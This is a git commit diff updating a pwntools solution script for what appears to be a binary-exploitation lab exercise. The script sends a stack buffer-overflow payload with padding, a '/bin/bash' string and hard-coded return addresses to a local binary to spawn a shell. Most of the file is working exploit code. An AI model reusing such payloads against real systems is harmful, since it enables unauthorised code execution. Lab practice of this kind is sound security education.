725af1842ac5fed91c24f738e478ca05fe2e11c5
root <root@debian-s-1vcpu-1gb-35gb-intel-fra1-01>
2024-11-07 15:01:58 +0000

    Ex1 sol

--- lab3/solve_ex1.py
+++ lab3/solve_ex1.py
@@ -1,42 +1,52 @@
 from pwn import *
 
 context.arch = "amd64"
-io = gdb.debug(
-    "./bin/ex1",
-    """
-    break ex1.c:48
-    continue
-    """,
-    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
-)
+context.terminal = ["tmux", "split-window", "-h"]
+context.log_level = "debug"
+
 target = process("./bin/ex1")
 
+# io = gdb.debug(
+#     "./bin/ex1",
+#     """
+#     break ex1.c:56
+#     continue
+#     """,
+# )
+
 bin_sh = b"/bin/bash\0" + b"A" * 54
-# io.sendline("0")
+argv = b"\0" * 8 + b"A" * 56
+# io.sendline("1")
 # io.sendline(
-#     arg
+#     argv
+#     + b"A" * 64
 #     + bin_sh
-#     + b"\0" * 64
-#     + b"\0" * 2 * 64
-#     + b"\0" * 16
+#     + b"A" * 2 * 64
+#     + b"A" * 16
+#     + p64(0x7FFFFFFFD8FC)
+#     + p64(0x7ffff7eafb60)
+# )
+# io.interactive()
+target.sendline("1")
+target.sendline(
+    argv
+    + b"A" * 64
+    + bin_sh
+    + b"A" * 2 * 64
+    + b"A" * 16
+    + p64(0x7FFFFFFFD8FC)
+    + p64(0x7ffff7eafb60)
+)
+# target.sendline(
+#     b"A" * 64
+#     + bin_sh
+#     + b"A" * 64
+#     + b"A" * 2 * 64
+#     + b"A" * 16
 #     + p64(0x7FFFFFFFD8FC)
 #     + p64(0x7FFFF7EA3440)
 #     + p64(0x7FFFF7EA3440)
 #     + p64(0x7FFFF7EA3440)
 #     + p64(0x7FFFF7E1A490)
 # )
-# io.interactive()
-target.sendline("0")
-target.sendline(
-    b"A" * 64
-    + bin_sh
-    + b"A" * 64
-    + b"A" * 2 * 64
-    + b"A" * 16
-    + p64(0x7FFFFFFFD8FC)
-    + p64(0x7FFFF7EA3440)
-    + p64(0x7FFFF7EA3440)
-    + p64(0x7FFFF7EA3440)
-    + p64(0x7FFFF7E1A490)
-)
 target.interactive()
